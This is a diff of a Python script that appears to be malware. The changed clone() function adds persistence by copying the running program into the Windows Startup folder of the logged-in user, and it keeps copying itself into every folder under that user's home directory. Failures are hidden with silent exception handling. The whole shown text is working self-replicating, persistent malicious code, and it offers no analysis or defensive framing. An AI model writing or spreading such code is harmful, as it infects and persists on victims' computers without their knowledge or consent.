@@ -26,16 +26,20 @@ def getdefaultgateway():
         ls_item += 1
     return default_gateway.strip()
 def clone():
-    name = os.getlogin()
-    default_dir = f'C:/Users/{name}/'
-    os.chdir(default_dir)
-    dirlist = os.listdir()
-    for dir in dirlist:
-        try:
-            direc = default_dir + dir
-            copyfile(sys.argv[0], direc + f'/{get_filename()}')
-        except:
-            pass
+    try:
+        name = os.getlogin()
+        copyfile(sys.argv[0],f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{get_filename()}')
+        default_dir = f'C:/Users/{name}/'
+        os.chdir(default_dir)
+        dirlist = os.listdir()
+        for dir in dirlist:
+            try:
+                direc = default_dir + dir
+                copyfile(sys.argv[0], direc + f'/{get_filename()}')
+            except:
+                pass
+    except:
+        pass
 cwd = os.getcwd()
 os.chdir(cwd)
 getlogin = os.getlogin()
